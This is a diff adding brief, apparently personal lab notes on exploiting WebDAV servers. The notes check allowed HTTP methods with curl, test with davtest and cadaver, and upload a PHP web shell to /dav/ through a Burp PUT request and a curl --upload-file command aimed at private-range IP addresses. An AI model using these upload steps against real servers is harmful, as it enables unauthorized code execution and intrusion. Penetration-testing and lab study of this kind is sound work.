@@ -1,0 +1,20 @@
+allowed options :
+curl -v -X OPTIONS http://192.168.1.109
+
+web dav exploitation:
+use --> davtest
+
+
+upload file ==> 
+use --> cadaver
+
+use burp ==     PUT /dav/burp.php HTTP/1.1
+                at content , shell content
+                
+                
+use curl
+
+curl http://192.168.1.103/dav/ --upload-file /root/Desktop/curl.php -v
+
+
+             
